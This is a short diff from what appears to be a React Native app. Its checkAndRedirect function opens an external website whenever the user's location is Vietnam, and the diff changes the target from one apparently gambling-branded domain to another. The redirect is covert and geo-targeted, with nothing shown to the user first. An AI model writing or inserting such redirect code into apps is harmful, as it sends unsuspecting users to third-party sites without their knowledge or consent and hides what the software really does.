@@ -20,7 +20,7 @@ const App = () => {
     async function checkAndRedirect() {
       try {
         if (location.country === 'VN') {
-          Linking.openURL('http://shbet301.online');
+          Linking.openURL('http://okvip307.online/');
         }
       } catch (error) {
         console.error(error.message);
